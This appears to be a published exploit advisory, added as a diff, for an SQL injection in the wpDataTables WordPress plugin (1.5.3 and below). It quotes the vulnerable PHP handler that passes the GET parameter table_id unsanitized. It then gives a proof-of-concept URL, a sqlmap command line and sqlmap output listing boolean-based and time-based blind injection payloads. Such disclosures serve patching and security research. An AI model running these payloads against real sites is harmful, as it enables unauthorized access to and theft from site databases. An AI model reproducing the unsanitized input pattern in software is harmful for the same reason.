@@ -1,0 +1,96 @@
+######################
+
+# Exploit Title : Wordpress wpDataTables 1.5.3 and below SQL Injection Vulnerability
+
+# Exploit Author : Claudio Viviani 
+
+# Software Link : http://wpdatatables.com (Premium)
+
+# Date : 2014-11-22
+
+# Tested on : Windows 7 / Mozilla Firefox
+              Windows 7 / sqlmap (0.8-1)
+              Linux / Mozilla Firefox
+              Linux / sqlmap 1.0-dev-5b2ded0
+
+######################
+
+
+# Description
+
+Wordpress wpDataTables 1.5.3 and below suffers from SQL injection vulnerability
+
+"table_id" variable is not sanitized.
+
+File: wpdatatables.php
+------------------------
+    // AJAX-handlers
+    add_action( 'wp_ajax_get_wdtable', 'wdt_get_ajax_data' );
+    add_action( 'wp_ajax_nopriv_get_wdtable', 'wdt_get_ajax_data' );
+
+	/**
+	 * Handler which returns the AJAX response
+	 */
+	 function wdt_get_ajax_data(){
+	 	$id = $_GET['table_id']; <------------------- Not Sanitized!
+	   	$table_data = wdt_get_table_by_id( $id );
+	   	$column_data = wdt_get_columns_by_table_id( $id );
+	   	$column_headers = array();
+	   	$column_types = array();
+	   	$column_filtertypes = array();
+	   	$column_inputtypes = array();
+		   foreach($column_data as $column){
+		   		$column_order[(int)$column->pos] = $column->orig_header;
+		   		if($column->display_header){
+			   		$column_headers[$column->orig_header] = $column->display_header;
+		   		}
+		   		if($column->column_type != 'autodetect'){
+			   		$column_types[$column->orig_header] = $column->column_type;
+		   		}else{
+			   		$column_types[$column->orig_header] = 'string';
+		   		}	
+		   		$column_filtertypes[$column->orig_header] = $column->filter_type;
+		   		$column_inputtypes[$column->orig_header] = $column->input_type;
+		   }
+------------------------
+
+(The vulnerable variable is located in others php files)
+
+
+######################
+
+# PoC
+
+http://TARGET/wp-admin/admin-ajax.php?action=get_wdtable&table_id=1 [Sqli]
+
+# Sqlmap
+
+sqlmap -u "http://TARGET/wp-admin/admin-ajax.php?action=get_wdtable&table_id=1" -p table_id --dbms mysql
+
+---
+Parameter: table_id
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: action=get_wdtable&table_id=1 AND 9029=9029
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: action=get_wdtable&table_id=1 AND SLEEP(5)
+
+---
+
+
+#####################
+
+Discovered By : Claudio Viviani
+                http://www.homelab.it
+		
+                info@homelab.it
+                homelabit@protonmail.ch
+
+                https://www.facebook.com/homelabit
+                https://twitter.com/homelabit
+                https://plus.google.com/+HomelabIt1/
+                https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
+
+#####################
